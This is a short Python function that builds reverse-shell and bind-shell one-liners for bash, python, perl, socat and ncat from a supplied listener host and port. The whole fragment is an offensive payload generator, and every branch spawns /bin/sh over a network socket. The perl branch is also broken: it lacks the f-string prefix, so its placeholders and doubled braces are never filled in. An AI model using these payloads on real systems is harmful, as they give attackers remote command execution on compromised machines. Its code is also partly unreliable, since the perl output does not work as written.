def generate_payload(payload_type, lhost, lport): if payload_type == "bash_reverse": return f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"

elif payload_type == "python_reverse":
    return (
        "python3 -c 'import socket,subprocess,os;"
        f"s=socket.socket();s.connect((\"{lhost}\",{lport}));"
        "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
        "p=subprocess.call([\"/bin/sh\"])'"
    )

elif payload_type == "perl_reverse":
    return (
        "perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
        "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
        "if(connect(S,sockaddr_in($p,inet_aton($i)))){{"
        "open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
    )

elif payload_type == "socat_reverse":
    return f"socat TCP:{lhost}:{lport} EXEC:/bin/sh"

elif payload_type == "socat_bind":
    return f"socat TCP-LISTEN:{lport},reuseaddr,fork EXEC:/bin/sh"

elif payload_type == "ncat_reverse":
    return f"ncat {lhost} {lport} -e /bin/sh"

elif payload_type == "ncat_bind":
    return f"ncat -lvp {lport} -e /bin/sh"

else:
    raise ValueError("[!] Unsupported payload type.")
